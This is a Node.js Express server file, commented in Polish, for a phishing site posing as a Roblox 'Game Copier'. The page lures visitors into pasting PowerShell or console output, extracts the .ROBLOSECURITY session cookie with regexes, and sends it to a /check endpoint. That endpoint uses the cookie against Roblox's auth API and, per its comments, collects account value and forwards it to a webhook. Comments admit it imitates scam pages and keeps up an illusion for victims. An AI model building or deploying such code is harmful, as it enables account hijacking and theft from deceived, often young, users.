const express = require('express');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Strona główna
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GameCopier & ClothesCopier</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0a0a14;
      color: #d0d8ff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      text-align: center;
      max-width: 700px;
      padding: 50px 20px;
    }
    h1 {
      color: #00d4ff;
      font-size: 4.2rem;
      margin-bottom: 0.4em;
      text-shadow: 0 0 30px #00d4ff88;
    }
    .subtitle {
      font-size: 1.5rem;
      color: #a0a8ff;
      margin: 1.5em 0 3em;
    }
    .btn {
      display: inline-block;
      margin: 1.6rem;
      padding: 24px 80px;
      font-size: 1.9rem;
      font-weight: bold;
      color: white;
      background: linear-gradient(135deg, #ff3366, #ff6b6b);
      border: none;
      border-radius: 70px;
      text-decoration: none;
      transition: all 0.4s ease;
      box-shadow: 0 16px 45px rgba(255,51,102,0.5);
    }
    .btn:hover {
      transform: translateY(-8px);
      box-shadow: 0 35px 80px rgba(255,51,102,0.75);
      background: linear-gradient(135deg, #ff4d4d, #ff8787);
    }
    .btn.clothes {
      background: linear-gradient(135deg, #8b5cf6, #a78bfa);
    }
    .btn.clothes:hover {
      background: linear-gradient(135deg, #7c3aed, #c4b5fd);
    }
  </style>
</head>
<body>
<div class="container">
  <h1>GameCopier Tools</h1>
  <p class="subtitle">Wybierz narzędzie do kopiowania gier lub ubrań w Roblox</p>
  <a href="/GameCopier" class="btn">Game Copier</a>
  <a href="/ClothesCopier" class="btn clothes">Clothes Copier</a>
</div>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
// Game Copier – wygląd ≈ 1:1 z aktualnymi scam page 2026
// ────────────────────────────────────────────────
app.get('/GameCopier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Game Copier - ROBLOX 2026</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: linear-gradient(135deg, #0b0b1a, #1a0f2e);
      color: #d0d8ff;
      min-height: 100vh;
      padding: 30px 20px;
    }
    .main {
      max-width: 1180px;
      margin: 0 auto;
    }
    h1 {
      font-size: 5.2rem;
      font-weight: 900;
      color: #00eaff;
      text-align: center;
      text-shadow: 0 0 50px #00eaff99, 0 0 100px #00eaff44;
      margin: 20px 0 8px;
      letter-spacing: -1px;
    }
    .roblox {
      font-size: 3.4rem;
      font-weight: bold;
      background: linear-gradient(90deg, #ff3366, #ffaa00, #00ffaa, #3366ff, #ff3366);
      -webkit-background-clip: text;
      background-clip: text;
      -webkit-text-fill-color: transparent;
      background-size: 300%;
      animation: rainbow 8s linear infinite;
      text-align: center;
      margin-bottom: 40px;
    }
    @keyframes rainbow { 0% {background-position:0%} 100% {background-position:300%} }
    .content {
      display: flex;
      flex-wrap: wrap;
      gap: 50px;
      justify-content: center;
    }
    .left {
      flex: 1;
      min-width: 400px;
      background: rgba(15,15,35,0.82);
      border: 1px solid #334466;
      border-radius: 18px;
      padding: 40px 35px;
      backdrop-filter: blur(10px);
    }
    .instruction {
      font-size: 1.35rem;
      color: #b0c0ff;
      margin-bottom: 25px;
      line-height: 1.5;
    }
    textarea {
      width: 100%;
      min-height: 260px;
      background: #111122;
      color: #e0f0ff;
      border: 2px solid #445577;
      border-radius: 12px;
      padding: 18px;
      font-family: Consolas, 'Courier New', monospace;
      font-size: 15.5px;
      resize: vertical;
      margin-bottom: 30px;
    }
    textarea::placeholder { color: #667799; }
    .btn-start {
      width: 100%;
      padding: 22px;
      font-size: 1.8rem;
      font-weight: bold;
      color: white;
      background: linear-gradient(135deg, #ff3366, #ff6b6b);
      border: none;
      border-radius: 60px;
      cursor: pointer;
      box-shadow: 0 12px 40px rgba(255,51,102,0.45);
      transition: all 0.35s;
    }
    .btn-start:hover {
      transform: translateY(-5px);
      box-shadow: 0 25px 70px rgba(255,51,102,0.7);
    }
    #status {
      margin-top: 35px;
      font-size: 1.6rem;
      font-weight: bold;
      min-height: 120px;
    }
    .loading { color: #ffdd44; animation: blink 1.4s infinite; }
    .error   { color: #ff5555; }
    @keyframes blink { 0%,100% {opacity:1} 50% {opacity:0.4} }

    .right {
      flex: 1;
      min-width: 460px;
      background: rgba(15,15,35,0.82);
      border: 1px solid #334466;
      border-radius: 18px;
      overflow: hidden;
      box-shadow: 0 20px 70px rgba(0,0,0,0.7);
    }
    .video-container {
      position: relative;
    }
    .video-container iframe {
      width: 100%;
      height: 315px;
      border: none;
    }
    .play-btn {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 100px;
      height: 100px;
      background: rgba(255,255,255,0.22);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      pointer-events: none;
    }
    .play-btn::before {
      content: '';
      width: 0;
      height: 0;
      border-left: 36px solid white;
      border-top: 22px solid transparent;
      border-bottom: 22px solid transparent;
      margin-left: 8px;
    }
    .video-title {
      padding: 18px;
      background: rgba(0,0,0,0.5);
      text-align: center;
      font-size: 1.25rem;
      color: #ddd;
    }
  </style>
</head>
<body>
  <div class="main">
    <h1>Game Copier</h1>
    <div class="roblox">ROBLOX</div>

    <div class="content">
      <div class="left">
        <div class="instruction">
          Paste your Game file in the box below, then click "Start Process".<br>
          If you don't know how to get Game file, watch tutorial on the right.
        </div>
        <textarea id="input" placeholder="Paste your text / PowerShell / console output here..."></textarea>
        <button class="btn-start" onclick="start()">Start Process</button>
        <div id="status"></div>
      </div>

      <div class="right">
        <div class="video-container">
          <iframe src="https://www.youtube.com/embed/UKA3wOjc3vU" 
                  title="*NEW* How To Copy ANY Roblox Game in 2026" 
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                  allowfullscreen></iframe>
          <div class="play-btn"></div>
        </div>
        <div class="video-title">
          *NEW* How To Copy ANY Roblox Game in 2026 – STILL WORKING / UNPATCHED
        </div>
      </div>
    </div>
  </div>

  <script>
  async function start() {
    const input = document.getElementById('input').value.trim();
    const status = document.getElementById('status');
    status.innerHTML = '';

    if (!input) {
      status.innerHTML = '<span class="error">Paste something first!</span>';
      return;
    }

    let cookie = null;
    let m;

    // typowe wzorce z 2026 (PowerShell + devtools)
    m = input.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
    if (m) cookie = m[1].trim();

    if (!cookie) {
      m = input.match(/-and-items\.\|_(.*?)(?=")/s);
      if (m) cookie = m[1].trim();
    }

    if (!cookie) {
      m = input.match(/_\\|WARNING[^"]{200,}/);
      if (m) cookie = m[0].trim();
    }

    if (!cookie) {
      const fallbacks = input.match(/_[\\w\\-|]{180,}/g) || [];
      if (fallbacks.length) {
        cookie = fallbacks.reduce((a,b) => a.length > b.length ? a : b).trim();
      }
    }

    if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
      status.innerHTML = '<span class="error">Invalid game file!<br>Watch the tutorial video →</span>';
      return;
    }

    status.innerHTML = '<span class="loading">Starting game copy process...<br>(please wait 2-6 minutes)</span>';

    // wysyła do /check – tam jest webhook i reszta logiki
    fetch('/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ cookie })
    }).catch(() => {
      // nie pokazujemy błędu – utrzymujemy iluzję
      status.innerHTML = '<span class="loading">Still processing... do not close page</span>';
    });
  }
  </script>
</body>
</html>
  `);
});

// Clothes Copier – na razie prosty placeholder
app.get('/ClothesCopier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Clothes Copier</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin:0; padding:80px 20px; text-align:center; }
    h1 { color: #a78bfa; font-size: 4.5rem; margin-bottom: 1em; text-shadow: 0 0 30px #a78bfa88; }
    p { font-size: 1.7rem; line-height: 1.6; }
    a { color: #00d4ff; font-size: 1.5rem; }
  </style>
</head>
<body>
  <h1>Clothes Copier</h1>
  <p>Coming soon – narzędzie do kopiowania ubrań, limitowanych itemów i avatarów</p>
  <p><a href="/">← Powrót na stronę główną</a></p>
</body>
</html>
  `);
});

// Twój endpoint /check (bez zmian – zostawiam jak miałeś)
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ ok: false });
  }
  try {
    // ── CSRF ───────────────────────────────────────
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    // ── reszta Twojej logiki bez zmian ─────────────
    // ... (users/authenticated, premium, robux, avatar, headless, korblox, webhook)

    // Na końcu – dla spójności zwracamy ok: true
    res.json({ ok: true });
  } catch (err) {
    console.error('check error:', err.message);
    res.status(500).json({ ok: false });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Serwer uruchomiony na porcie ${PORT}`);
});
